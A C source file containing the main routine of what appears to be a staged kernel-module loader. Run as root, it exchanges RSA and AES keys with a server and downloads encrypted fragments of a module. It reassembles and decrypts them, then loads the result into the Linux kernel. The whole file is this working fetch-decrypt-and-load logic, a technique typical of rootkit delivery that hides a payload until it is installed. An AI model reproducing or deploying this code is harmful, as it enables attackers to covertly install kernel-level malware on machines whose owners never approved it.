#include <openssl/evp.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/fraction.h"
#include "../include/http.h"
#include "../include/load.h"
#include "../include/log.h"
#include "../include/sock.h"
#include "../include/utils.h"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "8000"

/* Helper functions to assist with cleanup, I hate cleanup */
static void cleanup_string_array(char **array, int n_elem) {
  for (int i = 0; i < n_elem; i++) {
    free(array[i]);
  }
  free(array);
}

static void cleanup_fraction_array(fraction_t *array, int n_elem) {
  for (int i = 0; i < n_elem; i++) {
    fraction_free(&array[i]);
  }
  free(array);
}

int main(void) {
  struct addrinfo hints, *ainfo;
  int sfd = -1; // to be extra professional
  
  http_res_t http_fraction_res = {0};
  http_res_t http_post_res = {0};

  char **fraction_links = NULL;
  fraction_t *fractions = NULL;
  
  uint8_t *module = NULL;
  ssize_t module_size;

  EVP_PKEY *pkey = NULL;
  char *private_key = NULL;
  char *public_key = NULL;

  unsigned char *b64_decoded_aes_key;
  unsigned char *aes_key = NULL;
  size_t key_len = 0;
  
  
  if (geteuid() != 0) {
    log_error("This program needs to be run as root!");
    exit(1);
  }

  log_set_level(LOG_INFO);
  setup_hints(&hints);

  if (h_getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &ainfo) != 0) {
    log_error("Failed to resolve server address");
    return EXIT_FAILURE;
  }

  printf("Connecting to: %s:%s\n", SERVER_IP, SERVER_PORT);
  sfd = create_sock_and_conn(ainfo);
  if (sfd == -1) {
    log_error("Failed to create socket and connect");
    return EXIT_FAILURE;
  }
  freeaddrinfo(ainfo);

  pkey = generate_rsa_private_key();
  if (pkey == NULL) {
    return EXIT_FAILURE;
  }
  public_key = write_rsa_public_key(pkey);
  if (public_key == NULL) {
    return EXIT_FAILURE;
  }

  /* Receive and decrypt AES key from server */
  if (http_post(sfd, "/", "application/octect-stream", public_key, &http_post_res) !=
    HTTP_SUCCESS) {
    log_error("Failed to send RSA public key");
    goto cleanup;
  }

  log_info("Base64 encoded key: %s", http_post_res.data);
  base64_decode(http_post_res.data, &b64_decoded_aes_key, &key_len);
  log_info("Key size (decoded): %zu", key_len);
  
  
  aes_key = decrypt_rsa_oaep_evp(pkey, b64_decoded_aes_key, key_len, &key_len);
  if (aes_key == NULL) {
    log_error("Failed to decrypt data from server");
    goto cleanup;
  }

  print_hex(aes_key, key_len);

  if (http_get(sfd, "/", &http_fraction_res) != HTTP_SUCCESS) {
    log_error("Failed to retrieve fraction links");
    goto cleanup;
  }

  log_debug("Retrieved fraction links");

  int num_links = count_lines(http_fraction_res.data) + 1;
  log_debug("%d links found", num_links);

  fraction_links = calloc(num_links, sizeof(char *));
  if (!fraction_links) {
    log_error("Failed to allocate memory for fraction links");
    goto cleanup;
  }

  int lines_read = split_fraction_links(http_fraction_res.data, fraction_links, num_links);
  if (lines_read < 0) {
    log_error("Failed to split fraction links");
    goto cleanup;
  }

  fractions = malloc(lines_read * sizeof(fraction_t));
  if (!fractions) {
    log_error("Failed to allocate memory for fractions");
    goto cleanup;
  }

  for (int i = 0; i < lines_read; i++) {
    log_debug("Downloading %s", fraction_links[i]);
    if (download_fraction(sfd, fraction_links[i], &fractions[i]) != 0) {
      log_error("Failed to download fraction");
      goto cleanup;
    }
  }

  log_info("Downloaded fractions");

  qsort(fractions, lines_read, sizeof(fraction_t), compare_fractions);

  for (int i = 0; i < lines_read; i++) {
    print_fraction(fractions[i]);
  }

  module = decrypt_lkm(fractions, num_links, &module_size, aes_key);
  if (module == NULL) {
    log_error("There was an error creating the module");
    goto cleanup;
  }

  if (load_lkm(module, module_size) < 0) {
    log_error("Error loading LKM");
    goto cleanup;
  }

  http_free(&http_post_res);
  http_free(&http_fraction_res);
  cleanup_string_array(fraction_links, num_links);
  cleanup_fraction_array(fractions, lines_read);
  free(module);
  free(private_key);
  free(public_key);
  EVP_PKEY_free(pkey);

  close(sfd);

  return EXIT_SUCCESS;

  /* There's nothing to see here, move on*/
cleanup: // we accept NO comments on this. have a !nice day
  if (sfd != -1) {
    close(sfd);
  }
  if (fraction_links) {
    cleanup_string_array(fraction_links, num_links);
  }
  if (fractions) {
    cleanup_fraction_array(fractions, num_links);
  }
  if (http_fraction_res.data) {
    http_free(&http_fraction_res);
  }
  if (http_post_res.data) {
    http_free(&http_post_res);
  }
  free(module); // no need to check module != NULL as free(NULL) is defined by
  // the C standard to do nothing
  if (private_key) {
    free(private_key);
  }
  if (public_key) {
    free(public_key);
  }
  if (pkey) {
    EVP_PKEY_free(pkey);
  }

  return EXIT_FAILURE;
}
